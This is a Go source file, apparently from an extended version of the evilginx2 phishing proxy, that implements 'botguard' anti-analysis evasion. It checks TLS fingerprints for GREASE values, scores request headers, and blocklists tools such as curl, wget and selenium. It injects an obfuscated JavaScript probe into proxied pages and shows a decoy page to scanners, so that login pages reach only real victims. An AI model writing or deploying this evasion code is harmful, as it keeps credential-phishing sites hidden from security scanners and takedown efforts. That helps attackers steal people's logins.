package core

// botguard.go — evilginx2-extended: bot/scanner detection.
// v1: TLS ClientHello GREASE check + header heuristics + UA blocklist -> decoy.
// v2 (Pro "Botguard" JS telemetry layer): sessions get an obfuscated JS probe
// injected into HTML responses; the probe POSTs lightweight browser signals
// to /t/<hmac-token>. Sessions that never verify within the grace window are
// gated (credential-bearing requests get the decoy page instead of the proxy).

import (
	"bufio"
	"crypto/hmac"
	"crypto/sha256"
	"encoding/hex"
	"net"
	"net/http"
	"regexp"
	"strings"
	"time"

	"github.com/elazarl/goproxy"
	"github.com/kgretzky/evilginx2/log"
)

const decoyHTML = `<!doctype html>
<html><head><title>Welcome</title></head>
<body><h1>It works!</h1><hr><p>This page is intentionally boring.</p></body></html>`

const bgProbeTemplate = `(function(){var t="%TOKEN%";try{var s={wd:navigator.webdriver||false,pl:(navigator.plugins||[]).length,chr:!!(window.chrome&&window.chrome.runtime),tz:new Date().getTimezoneOffset(),sw:screen.width+"x"+screen.height};var f=new FormData();f.append("d",btoa(JSON.stringify(s)));fetch("/t/"+t,{method:"POST",body:f}).catch(function(){});}catch(e){}})();`

var botUARe = regexp.MustCompile(`(?i)(curl|wget|python-requests|python-urllib|libwww|httpclient|scrapy|okhttp|java/|go-http-client|headlesschrome|phantomjs|selenium|httpx|axios|node-fetch)`)

type bgSessionState struct {
	firstSeen time.Time
	verified  bool
}

// peekConn lets us inspect the first bytes of a fresh TLS connection
// (the ClientHello) without consuming them.
type peekConn struct {
	net.Conn
	Reader *bufio.Reader
}

func newPeekConn(c net.Conn) *peekConn {
	return &peekConn{Conn: c, Reader: bufio.NewReader(c)}
}

func (p *peekConn) Read(b []byte) (int, error) {
	return p.Reader.Read(b)
}

// parseClientHelloGrease peeks exactly one TLS record, walks the
// ClientHello structure up to the cipher_suites list and checks it for
// GREASE values. ok=false means "not a parseable ClientHello" — callers
// must then ignore the TLS signal.
func parseClientHelloGrease(br *bufio.Reader) (hasGrease bool, ok bool) {
	h, err := br.Peek(5)
	if err != nil || h[0] != 0x16 {
		return false, false
	}
	rl := int(h[3])<<8 | int(h[4])
	need := 5 + rl
	if rl < 44 || need > 16400 {
		return false, false
	}
	buf, err := br.Peek(need)
	if err != nil {
		return false, false
	}
	hs := buf[5:]
	if hs[0] != 0x01 {
		return false, false
	}
	sidLen := int(hs[38])
	p := 39 + sidLen
	if p+2 > len(hs) {
		return false, false
	}
	csLen := int(hs[p])<<8 | int(hs[p+1])
	p += 2
	if p+csLen > len(hs) {
		csLen = len(hs) - p
	}
	for i := 0; i+1 < csLen; i += 2 {
		v := int(hs[p+i])<<8 | int(hs[p+i+1])
		if v >= 0x0a0a && (v>>8) == (v&0xff) && v&0x0f == 0x0a {
			return true, true
		}
	}
	return false, true
}

func (p *HttpProxy) SetBotguard(on bool) {
	p.botguard = on
	if on {
		log.Info("botguard: enabled (TLS GREASE + header heuristics + JS telemetry, decoy on detection)")
	}
}

func (p *HttpProxy) SetBotguardUAFilter(on bool) {
	p.bg_no_ua = !on
}

func (p *HttpProxy) SetBotguardGrace(seconds int) {
	if seconds > 0 {
		p.bg_grace = seconds
	}
}

func (p *HttpProxy) noteHelloGrease(remoteAddr string, br *bufio.Reader) {
	g, ok := parseClientHelloGrease(br)
	if !ok {
		return
	}
	p.bg_mtx.Lock()
	p.bg_grease[remoteAddr] = g
	p.bg_mtx.Unlock()
}

// bgState returns (creating on first use) the telemetry state of a session.
func (p *HttpProxy) bgState(sid string) *bgSessionState {
	p.bg_mtx.Lock()
	defer p.bg_mtx.Unlock()
	st, ok := p.bgStateMap[sid]
	if !ok {
		st = &bgSessionState{firstSeen: time.Now()}
		p.bgStateMap[sid] = st
	}
	return st
}

func (p *HttpProxy) bgIsVerified(sid string) bool {
	p.bg_mtx.Lock()
	defer p.bg_mtx.Unlock()
	if st, ok := p.bgStateMap[sid]; ok {
		return st.verified
	}
	return false
}

// bgToken derives the per-session telemetry token: HMAC-SHA256(lureKey, "bg:"+sid).
func (p *HttpProxy) bgToken(sid string) string {
	mac := hmac.New(sha256.New, p.cfg.LureKey())
	mac.Write([]byte("bg:" + sid))
	return hex.EncodeToString(mac.Sum(nil))[:32]
}

// bgProbeScript returns the telemetry probe for a session (goes through
// ObfuscateJS at the inline-injection choke point, so it has no static
// fingerprint).
func (p *HttpProxy) bgProbeScript(sid string) string {
	tok := p.bgToken(sid)
	p.bg_mtx.Lock()
	p.bg_tokens[tok] = sid
	p.bg_mtx.Unlock()
	return strings.Replace(bgProbeTemplate, "%TOKEN%", tok, 1)
}

// botguardTelemetry handles POST /t/<token> from the probe.
func (p *HttpProxy) botguardTelemetry(req *http.Request) *http.Response {
	tok := strings.TrimPrefix(req.URL.Path, "/t/")
	p.bg_mtx.Lock()
	sid, ok := p.bg_tokens[tok]
	if ok {
		if st, sok := p.bgStateMap[sid]; sok {
			st.verified = true
		}
	}
	p.bg_mtx.Unlock()
	status := http.StatusOK
	if !ok {
		status = http.StatusForbidden
	}
	log.Info("botguard: telemetry result=%v", ok)
	resp := goproxy.NewResponse(req, "text/plain", status, "")
	return resp
}

func bgMin(a, b int) int {
	if a < b {
		return a
	}
	return b
}

// isBotRequest: v1 per-request heuristics + v2 session gating.
// Gating rule: once the grace window has passed, an unverified session gets
// the decoy page for credential-bearing requests (POSTs and the phishlet
// login path). Navigation GETs still pass so the probe itself can load.
func (p *HttpProxy) isBotRequest(req *http.Request, ps *ProxySession) bool {
	if !p.botguard {
		return false
	}
	host := strings.ToLower(req.Host)
	if !p.cfg.IsActiveHostname(host) {
		return false
	}
	if !strings.HasPrefix(req.URL.Path, "/t/") {
		ua := req.Header.Get("User-Agent")
		if !p.bg_no_ua && botUARe.MatchString(ua) {
			log.Warning("botguard: bot user-agent blocked (%s) ua='%s'", req.RemoteAddr, ua)
			return true
		}
		score := 0
		p.bg_mtx.Lock()
		g, ok := p.bg_grease[req.RemoteAddr]
		p.bg_mtx.Unlock()
		if ok && !g {
			score += 60
		}
		if req.Header.Get("Accept-Language") == "" {
			score += 20
		}
		if req.Header.Get("Sec-Fetch-Mode") == "" && req.Header.Get("Upgrade-Insecure-Requests") == "" {
			score += 20
		}
		if score >= 50 {
			log.Warning("botguard: bot detected (%s) score=%d ua='%s'", req.RemoteAddr, score, ua)
			return true
		}
	}
	// v2: session telemetry gating
	if ps != nil && ps.SessionId != "" && !strings.HasPrefix(req.URL.Path, "/t/") {
		st := p.bgState(ps.SessionId)
		p.bg_mtx.Lock()
		graceOver := time.Since(st.firstSeen) > time.Duration(p.bg_grace)*time.Second
		p.bg_mtx.Unlock()
		if graceOver && !st.verified {
			pl := p.getPhishletByPhishHost(req.Host)
			isCred := req.Method == "POST"
			if pl != nil && strings.EqualFold(req.URL.Path, pl.login.path) {
				isCred = true
			}
			if isCred {
				log.Warning("botguard: unverified session gated (sid=%s)", ps.SessionId[:bgMin(8, len(ps.SessionId))])
				return true
			}
		}
	}
	return false
}

func (p *HttpProxy) decoyRequest(req *http.Request) (*http.Request, *http.Response) {
	resp := goproxy.NewResponse(req, "text/html", http.StatusOK, decoyHTML)
	if resp != nil {
		return req, resp
	}
	return req, nil
}
